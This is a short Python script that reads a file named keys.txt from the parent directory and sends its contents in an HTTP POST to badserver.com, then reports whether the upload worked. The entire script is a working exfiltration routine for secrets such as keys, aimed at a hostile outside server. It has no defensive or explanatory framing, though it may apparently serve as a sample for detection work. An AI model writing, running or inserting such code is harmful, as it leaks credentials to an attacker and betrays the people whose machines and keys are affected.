import requests

with open('../keys.txt', 'r') as file:
    file_contents = file.read()

url = 'http://badserver.com/files'
payload = {'file_contents': file_contents}
response = requests.post(url, data=payload)

if response.status_code == 200:
    print('POST request successful')
else:
    print('POST request failed')

